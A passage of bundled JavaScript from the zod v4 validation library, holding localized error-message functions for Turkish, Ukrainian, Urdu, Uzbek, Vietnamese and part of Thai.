        return `\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07\u0E43\u0E19 ${issue2.origin}`;
      default:
        return `\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07`;
    }
  };
};
function th_default() {
  return {
    localeError: error39()
  };
}
// node_modules/zod/v4/locales/tr.js
var error40 = () => {
  const Sizable = {
    string: { unit: "karakter", verb: "olmal\u0131" },
    file: { unit: "bayt", verb: "olmal\u0131" },
    array: { unit: "\xF6\u011Fe", verb: "olmal\u0131" },
    set: { unit: "\xF6\u011Fe", verb: "olmal\u0131" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "girdi",
    email: "e-posta adresi",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO tarih ve saat",
    date: "ISO tarih",
    time: "ISO saat",
    duration: "ISO s\xFCre",
    ipv4: "IPv4 adresi",
    ipv6: "IPv6 adresi",
    cidrv4: "IPv4 aral\u0131\u011F\u0131",
    cidrv6: "IPv6 aral\u0131\u011F\u0131",
    base64: "base64 ile \u015Fifrelenmi\u015F metin",
    base64url: "base64url ile \u015Fifrelenmi\u015F metin",
    json_string: "JSON dizesi",
    e164: "E.164 say\u0131s\u0131",
    jwt: "JWT",
    template_literal: "\u015Eablon dizesi"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Ge\xE7ersiz de\u011Fer: beklenen instanceof ${issue2.expected}, al\u0131nan ${received}`;
        }
        return `Ge\xE7ersiz de\u011Fer: beklenen ${expected}, al\u0131nan ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Ge\xE7ersiz de\u011Fer: beklenen ${stringifyPrimitive(issue2.values[0])}`;
        return `Ge\xE7ersiz se\xE7enek: a\u015Fa\u011F\u0131dakilerden biri olmal\u0131: ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\xC7ok b\xFCy\xFCk: beklenen ${issue2.origin ?? "de\u011Fer"} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\xF6\u011Fe"}`;
        return `\xC7ok b\xFCy\xFCk: beklenen ${issue2.origin ?? "de\u011Fer"} ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\xC7ok k\xFC\xE7\xFCk: beklenen ${issue2.origin} ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        return `\xC7ok k\xFC\xE7\xFCk: beklenen ${issue2.origin} ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Ge\xE7ersiz metin: "${_issue.prefix}" ile ba\u015Flamal\u0131`;
        if (_issue.format === "ends_with")
          return `Ge\xE7ersiz metin: "${_issue.suffix}" ile bitmeli`;
        if (_issue.format === "includes")
          return `Ge\xE7ersiz metin: "${_issue.includes}" i\xE7ermeli`;
        if (_issue.format === "regex")
          return `Ge\xE7ersiz metin: ${_issue.pattern} desenine uymal\u0131`;
        return `Ge\xE7ersiz ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Ge\xE7ersiz say\u0131: ${issue2.divisor} ile tam b\xF6l\xFCnebilmeli`;
      case "unrecognized_keys":
        return `Tan\u0131nmayan anahtar${issue2.keys.length > 1 ? "lar" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `${issue2.origin} i\xE7inde ge\xE7ersiz anahtar`;
      case "invalid_union":
        return "Ge\xE7ersiz de\u011Fer";
      case "invalid_element":
        return `${issue2.origin} i\xE7inde ge\xE7ersiz de\u011Fer`;
      default:
        return `Ge\xE7ersiz de\u011Fer`;
    }
  };
};
function tr_default() {
  return {
    localeError: error40()
  };
}
// node_modules/zod/v4/locales/uk.js
var error41 = () => {
  const Sizable = {
    string: { unit: "\u0441\u0438\u043C\u0432\u043E\u043B\u0456\u0432", verb: "\u043C\u0430\u0442\u0438\u043C\u0435" },
    file: { unit: "\u0431\u0430\u0439\u0442\u0456\u0432", verb: "\u043C\u0430\u0442\u0438\u043C\u0435" },
    array: { unit: "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0456\u0432", verb: "\u043C\u0430\u0442\u0438\u043C\u0435" },
    set: { unit: "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0456\u0432", verb: "\u043C\u0430\u0442\u0438\u043C\u0435" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456",
    email: "\u0430\u0434\u0440\u0435\u0441\u0430 \u0435\u043B\u0435\u043A\u0442\u0440\u043E\u043D\u043D\u043E\u0457 \u043F\u043E\u0448\u0442\u0438",
    url: "URL",
    emoji: "\u0435\u043C\u043E\u0434\u0437\u0456",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u0434\u0430\u0442\u0430 \u0442\u0430 \u0447\u0430\u0441 ISO",
    date: "\u0434\u0430\u0442\u0430 ISO",
    time: "\u0447\u0430\u0441 ISO",
    duration: "\u0442\u0440\u0438\u0432\u0430\u043B\u0456\u0441\u0442\u044C ISO",
    ipv4: "\u0430\u0434\u0440\u0435\u0441\u0430 IPv4",
    ipv6: "\u0430\u0434\u0440\u0435\u0441\u0430 IPv6",
    cidrv4: "\u0434\u0456\u0430\u043F\u0430\u0437\u043E\u043D IPv4",
    cidrv6: "\u0434\u0456\u0430\u043F\u0430\u0437\u043E\u043D IPv6",
    base64: "\u0440\u044F\u0434\u043E\u043A \u0443 \u043A\u043E\u0434\u0443\u0432\u0430\u043D\u043D\u0456 base64",
    base64url: "\u0440\u044F\u0434\u043E\u043A \u0443 \u043A\u043E\u0434\u0443\u0432\u0430\u043D\u043D\u0456 base64url",
    json_string: "\u0440\u044F\u0434\u043E\u043A JSON",
    e164: "\u043D\u043E\u043C\u0435\u0440 E.164",
    jwt: "JWT",
    template_literal: "\u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0447\u0438\u0441\u043B\u043E",
    array: "\u043C\u0430\u0441\u0438\u0432"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0456 \u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F instanceof ${issue2.expected}, \u043E\u0442\u0440\u0438\u043C\u0430\u043D\u043E ${received}`;
        }
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0456 \u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F ${expected}, \u043E\u0442\u0440\u0438\u043C\u0430\u043D\u043E ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0456 \u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F ${stringifyPrimitive(issue2.values[0])}`;
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0430 \u043E\u043F\u0446\u0456\u044F: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F \u043E\u0434\u043D\u0435 \u0437 ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u0417\u0430\u043D\u0430\u0434\u0442\u043E \u0432\u0435\u043B\u0438\u043A\u0435: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F, \u0449\u043E ${issue2.origin ?? "\u0437\u043D\u0430\u0447\u0435\u043D\u043D\u044F"} ${sizing.verb} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0456\u0432"}`;
        return `\u0417\u0430\u043D\u0430\u0434\u0442\u043E \u0432\u0435\u043B\u0438\u043A\u0435: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F, \u0449\u043E ${issue2.origin ?? "\u0437\u043D\u0430\u0447\u0435\u043D\u043D\u044F"} \u0431\u0443\u0434\u0435 ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u0417\u0430\u043D\u0430\u0434\u0442\u043E \u043C\u0430\u043B\u0435: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F, \u0449\u043E ${issue2.origin} ${sizing.verb} ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `\u0417\u0430\u043D\u0430\u0434\u0442\u043E \u043C\u0430\u043B\u0435: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F, \u0449\u043E ${issue2.origin} \u0431\u0443\u0434\u0435 ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u0440\u044F\u0434\u043E\u043A: \u043F\u043E\u0432\u0438\u043D\u0435\u043D \u043F\u043E\u0447\u0438\u043D\u0430\u0442\u0438\u0441\u044F \u0437 "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u0440\u044F\u0434\u043E\u043A: \u043F\u043E\u0432\u0438\u043D\u0435\u043D \u0437\u0430\u043A\u0456\u043D\u0447\u0443\u0432\u0430\u0442\u0438\u0441\u044F \u043D\u0430 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u0440\u044F\u0434\u043E\u043A: \u043F\u043E\u0432\u0438\u043D\u0435\u043D \u043C\u0456\u0441\u0442\u0438\u0442\u0438 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u0440\u044F\u0434\u043E\u043A: \u043F\u043E\u0432\u0438\u043D\u0435\u043D \u0432\u0456\u0434\u043F\u043E\u0432\u0456\u0434\u0430\u0442\u0438 \u0448\u0430\u0431\u043B\u043E\u043D\u0443 ${_issue.pattern}`;
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0435 \u0447\u0438\u0441\u043B\u043E: \u043F\u043E\u0432\u0438\u043D\u043D\u043E \u0431\u0443\u0442\u0438 \u043A\u0440\u0430\u0442\u043D\u0438\u043C ${issue2.divisor}`;
      case "unrecognized_keys":
        return `\u041D\u0435\u0440\u043E\u0437\u043F\u0456\u0437\u043D\u0430\u043D\u0438\u0439 \u043A\u043B\u044E\u0447${issue2.keys.length > 1 ? "\u0456" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u043A\u043B\u044E\u0447 \u0443 ${issue2.origin}`;
      case "invalid_union":
        return "\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0456 \u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456";
      case "invalid_element":
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u043D\u044F \u0443 ${issue2.origin}`;
      default:
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0456 \u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456`;
    }
  };
};
function uk_default() {
  return {
    localeError: error41()
  };
}

// node_modules/zod/v4/locales/ua.js
function ua_default() {
  return uk_default();
}
// node_modules/zod/v4/locales/ur.js
var error42 = () => {
  const Sizable = {
    string: { unit: "\u062D\u0631\u0648\u0641", verb: "\u06C1\u0648\u0646\u0627" },
    file: { unit: "\u0628\u0627\u0626\u0679\u0633", verb: "\u06C1\u0648\u0646\u0627" },
    array: { unit: "\u0622\u0626\u0679\u0645\u0632", verb: "\u06C1\u0648\u0646\u0627" },
    set: { unit: "\u0622\u0626\u0679\u0645\u0632", verb: "\u06C1\u0648\u0646\u0627" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0627\u0646 \u067E\u0679",
    email: "\u0627\u06CC \u0645\u06CC\u0644 \u0627\u06CC\u0688\u0631\u06CC\u0633",
    url: "\u06CC\u0648 \u0622\u0631 \u0627\u06CC\u0644",
    emoji: "\u0627\u06CC\u0645\u0648\u062C\u06CC",
    uuid: "\u06CC\u0648 \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    uuidv4: "\u06CC\u0648 \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC \u0648\u06CC 4",
    uuidv6: "\u06CC\u0648 \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC \u0648\u06CC 6",
    nanoid: "\u0646\u06CC\u0646\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    guid: "\u062C\u06CC \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    cuid: "\u0633\u06CC \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    cuid2: "\u0633\u06CC \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC 2",
    ulid: "\u06CC\u0648 \u0627\u06CC\u0644 \u0622\u0626\u06CC \u0688\u06CC",
    xid: "\u0627\u06CC\u06A9\u0633 \u0622\u0626\u06CC \u0688\u06CC",
    ksuid: "\u06A9\u06D2 \u0627\u06CC\u0633 \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    datetime: "\u0622\u0626\u06CC \u0627\u06CC\u0633 \u0627\u0648 \u0688\u06CC\u0679 \u0679\u0627\u0626\u0645",
    date: "\u0622\u0626\u06CC \u0627\u06CC\u0633 \u0627\u0648 \u062A\u0627\u0631\u06CC\u062E",
    time: "\u0622\u0626\u06CC \u0627\u06CC\u0633 \u0627\u0648 \u0648\u0642\u062A",
    duration: "\u0622\u0626\u06CC \u0627\u06CC\u0633 \u0627\u0648 \u0645\u062F\u062A",
    ipv4: "\u0622\u0626\u06CC \u067E\u06CC \u0648\u06CC 4 \u0627\u06CC\u0688\u0631\u06CC\u0633",
    ipv6: "\u0622\u0626\u06CC \u067E\u06CC \u0648\u06CC 6 \u0627\u06CC\u0688\u0631\u06CC\u0633",
    cidrv4: "\u0622\u0626\u06CC \u067E\u06CC \u0648\u06CC 4 \u0631\u06CC\u0646\u062C",
    cidrv6: "\u0622\u0626\u06CC \u067E\u06CC \u0648\u06CC 6 \u0631\u06CC\u0646\u062C",
    base64: "\u0628\u06CC\u0633 64 \u0627\u0646 \u06A9\u0648\u0688\u0688 \u0633\u0679\u0631\u0646\u06AF",
    base64url: "\u0628\u06CC\u0633 64 \u06CC\u0648 \u0622\u0631 \u0627\u06CC\u0644 \u0627\u0646 \u06A9\u0648\u0688\u0688 \u0633\u0679\u0631\u0646\u06AF",
    json_string: "\u062C\u06D2 \u0627\u06CC\u0633 \u0627\u0648 \u0627\u06CC\u0646 \u0633\u0679\u0631\u0646\u06AF",
    e164: "\u0627\u06CC 164 \u0646\u0645\u0628\u0631",
    jwt: "\u062C\u06D2 \u0688\u0628\u0644\u06CC\u0648 \u0679\u06CC",
    template_literal: "\u0627\u0646 \u067E\u0679"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0646\u0645\u0628\u0631",
    array: "\u0622\u0631\u06D2",
    null: "\u0646\u0644"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u063A\u0644\u0637 \u0627\u0646 \u067E\u0679: instanceof ${issue2.expected} \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627\u060C ${received} \u0645\u0648\u0635\u0648\u0644 \u06C1\u0648\u0627`;
        }
        return `\u063A\u0644\u0637 \u0627\u0646 \u067E\u0679: ${expected} \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627\u060C ${received} \u0645\u0648\u0635\u0648\u0644 \u06C1\u0648\u0627`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u063A\u0644\u0637 \u0627\u0646 \u067E\u0679: ${stringifyPrimitive(issue2.values[0])} \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627`;
        return `\u063A\u0644\u0637 \u0622\u067E\u0634\u0646: ${joinValues(issue2.values, "|")} \u0645\u06CC\u06BA \u0633\u06D2 \u0627\u06CC\u06A9 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u0628\u06C1\u062A \u0628\u0691\u0627: ${issue2.origin ?? "\u0648\u06CC\u0644\u06CC\u0648"} \u06A9\u06D2 ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\u0639\u0646\u0627\u0635\u0631"} \u06C1\u0648\u0646\u06D2 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u06D2`;
        return `\u0628\u06C1\u062A \u0628\u0691\u0627: ${issue2.origin ?? "\u0648\u06CC\u0644\u06CC\u0648"} \u06A9\u0627 ${adj}${issue2.maximum.toString()} \u06C1\u0648\u0646\u0627 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u0628\u06C1\u062A \u0686\u06BE\u0648\u0679\u0627: ${issue2.origin} \u06A9\u06D2 ${adj}${issue2.minimum.toString()} ${sizing.unit} \u06C1\u0648\u0646\u06D2 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u06D2`;
        }
        return `\u0628\u06C1\u062A \u0686\u06BE\u0648\u0679\u0627: ${issue2.origin} \u06A9\u0627 ${adj}${issue2.minimum.toString()} \u06C1\u0648\u0646\u0627 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\u063A\u0644\u0637 \u0633\u0679\u0631\u0646\u06AF: "${_issue.prefix}" \u0633\u06D2 \u0634\u0631\u0648\u0639 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
        }
        if (_issue.format === "ends_with")
          return `\u063A\u0644\u0637 \u0633\u0679\u0631\u0646\u06AF: "${_issue.suffix}" \u067E\u0631 \u062E\u062A\u0645 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
        if (_issue.format === "includes")
          return `\u063A\u0644\u0637 \u0633\u0679\u0631\u0646\u06AF: "${_issue.includes}" \u0634\u0627\u0645\u0644 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
        if (_issue.format === "regex")
          return `\u063A\u0644\u0637 \u0633\u0679\u0631\u0646\u06AF: \u067E\u06CC\u0679\u0631\u0646 ${_issue.pattern} \u0633\u06D2 \u0645\u06CC\u0686 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
        return `\u063A\u0644\u0637 ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u063A\u0644\u0637 \u0646\u0645\u0628\u0631: ${issue2.divisor} \u06A9\u0627 \u0645\u0636\u0627\u0639\u0641 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
      case "unrecognized_keys":
        return `\u063A\u06CC\u0631 \u062A\u0633\u0644\u06CC\u0645 \u0634\u062F\u06C1 \u06A9\u06CC${issue2.keys.length > 1 ? "\u0632" : ""}: ${joinValues(issue2.keys, "\u060C ")}`;
      case "invalid_key":
        return `${issue2.origin} \u0645\u06CC\u06BA \u063A\u0644\u0637 \u06A9\u06CC`;
      case "invalid_union":
        return "\u063A\u0644\u0637 \u0627\u0646 \u067E\u0679";
      case "invalid_element":
        return `${issue2.origin} \u0645\u06CC\u06BA \u063A\u0644\u0637 \u0648\u06CC\u0644\u06CC\u0648`;
      default:
        return `\u063A\u0644\u0637 \u0627\u0646 \u067E\u0679`;
    }
  };
};
function ur_default() {
  return {
    localeError: error42()
  };
}
// node_modules/zod/v4/locales/uz.js
var error43 = () => {
  const Sizable = {
    string: { unit: "belgi", verb: "bo\u2018lishi kerak" },
    file: { unit: "bayt", verb: "bo\u2018lishi kerak" },
    array: { unit: "element", verb: "bo\u2018lishi kerak" },
    set: { unit: "element", verb: "bo\u2018lishi kerak" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "kirish",
    email: "elektron pochta manzili",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO sana va vaqti",
    date: "ISO sana",
    time: "ISO vaqt",
    duration: "ISO davomiylik",
    ipv4: "IPv4 manzil",
    ipv6: "IPv6 manzil",
    mac: "MAC manzil",
    cidrv4: "IPv4 diapazon",
    cidrv6: "IPv6 diapazon",
    base64: "base64 kodlangan satr",
    base64url: "base64url kodlangan satr",
    json_string: "JSON satr",
    e164: "E.164 raqam",
    jwt: "JWT",
    template_literal: "kirish"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "raqam",
    array: "massiv"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Noto\u2018g\u2018ri kirish: kutilgan instanceof ${issue2.expected}, qabul qilingan ${received}`;
        }
        return `Noto\u2018g\u2018ri kirish: kutilgan ${expected}, qabul qilingan ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Noto\u2018g\u2018ri kirish: kutilgan ${stringifyPrimitive(issue2.values[0])}`;
        return `Noto\u2018g\u2018ri variant: quyidagilardan biri kutilgan ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Juda katta: kutilgan ${issue2.origin ?? "qiymat"} ${adj}${issue2.maximum.toString()} ${sizing.unit} ${sizing.verb}`;
        return `Juda katta: kutilgan ${issue2.origin ?? "qiymat"} ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Juda kichik: kutilgan ${issue2.origin} ${adj}${issue2.minimum.toString()} ${sizing.unit} ${sizing.verb}`;
        }
        return `Juda kichik: kutilgan ${issue2.origin} ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Noto\u2018g\u2018ri satr: "${_issue.prefix}" bilan boshlanishi kerak`;
        if (_issue.format === "ends_with")
          return `Noto\u2018g\u2018ri satr: "${_issue.suffix}" bilan tugashi kerak`;
        if (_issue.format === "includes")
          return `Noto\u2018g\u2018ri satr: "${_issue.includes}" ni o\u2018z ichiga olishi kerak`;
        if (_issue.format === "regex")
          return `Noto\u2018g\u2018ri satr: ${_issue.pattern} shabloniga mos kelishi kerak`;
        return `Noto\u2018g\u2018ri ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Noto\u2018g\u2018ri raqam: ${issue2.divisor} ning karralisi bo\u2018lishi kerak`;
      case "unrecognized_keys":
        return `Noma\u2019lum kalit${issue2.keys.length > 1 ? "lar" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `${issue2.origin} dagi kalit noto\u2018g\u2018ri`;
      case "invalid_union":
        return "Noto\u2018g\u2018ri kirish";
      case "invalid_element":
        return `${issue2.origin} da noto\u2018g\u2018ri qiymat`;
      default:
        return `Noto\u2018g\u2018ri kirish`;
    }
  };
};
function uz_default() {
  return {
    localeError: error43()
  };
}
// node_modules/zod/v4/locales/vi.js
var error44 = () => {
  const Sizable = {
    string: { unit: "k\xFD t\u1EF1", verb: "c\xF3" },
    file: { unit: "byte", verb: "c\xF3" },
    array: { unit: "ph\u1EA7n t\u1EED", verb: "c\xF3" },
    set: { unit: "ph\u1EA7n t\u1EED", verb: "c\xF3" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0111\u1EA7u v\xE0o",
    email: "\u0111\u1ECBa ch\u1EC9 email",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ng\xE0y gi\u1EDD ISO",
    date: "ng\xE0y ISO",
    time: "gi\u1EDD ISO",
    duration: "kho\u1EA3ng th\u1EDDi gian ISO",
    ipv4: "\u0111\u1ECBa ch\u1EC9 IPv4",
    ipv6: "\u0111\u1ECBa ch\u1EC9 IPv6",
    cidrv4: "d\u1EA3i IPv4",
    cidrv6: "d\u1EA3i IPv6",
    base64: "chu\u1ED7i m\xE3 h\xF3a base64",
    base64url: "chu\u1ED7i m\xE3 h\xF3a base64url",
    json_string: "chu\u1ED7i JSON",
    e164: "s\u1ED1 E.164",
    jwt: "JWT",
    template_literal: "\u0111\u1EA7u v\xE0o"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "s\u1ED1",
    array: "m\u1EA3ng"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u0110\u1EA7u v\xE0o kh\xF4ng h\u1EE3p l\u1EC7: mong \u0111\u1EE3i instanceof ${issue2.expected}, nh\u1EADn \u0111\u01B0\u1EE3c ${received}`;
        }
        return `\u0110\u1EA7u v\xE0o kh\xF4ng h\u1EE3p l\u1EC7: mong \u0111\u1EE3i ${expected}, nh\u1EADn \u0111\u01B0\u1EE3c ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u0110\u1EA7u v\xE0o kh\xF4ng h\u1EE3p l\u1EC7: mong \u0111\u1EE3i ${stringifyPrimitive(issue2.values[0])}`;
        return `T\xF9y ch\u1ECDn kh\xF4ng h\u1EE3p l\u1EC7: mong \u0111\u1EE3i m\u1ED9t trong c\xE1c gi\xE1 tr\u1ECB ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `Qu\xE1 l\u1EDBn: mong \u0111\u1EE3i ${issue2.origin ?? "gi\xE1 tr\u1ECB"} ${sizing.verb} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "ph\u1EA7n t\u1EED"}`;
        return `Qu\xE1 l\u1EDBn: mong \u0111\u1EE3i ${issue2.origin ?? "gi\xE1 tr\u1ECB"} ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
